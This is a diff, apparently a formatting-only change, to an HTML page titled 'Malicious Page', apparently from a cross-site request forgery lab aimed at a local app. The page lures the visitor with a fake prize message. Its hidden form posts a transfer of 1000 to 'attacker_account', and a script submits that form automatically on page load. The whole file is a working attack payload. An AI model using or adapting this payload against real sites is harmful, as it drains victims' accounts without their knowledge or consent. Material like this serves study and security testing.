@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Malicious Page</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>You’ve won a prize! Click here to claim it!</h1>
     <form method="POST" action="http://127.0.0.1:5000/transfer">
-        <input type="hidden" name="recipient" value="attacker_account">
-        <input type="hidden" name="amount" value="1000">
+      <input type="hidden" name="recipient" value="attacker_account" />
+      <input type="hidden" name="amount" value="1000" />
     </form>
     <script>
-        // Automatically submit the form
-        document.forms[0].submit();
+      // Automatically submit the form
+      document.forms[0].submit();
     </script>
-</body>
+  </body>
 </html>
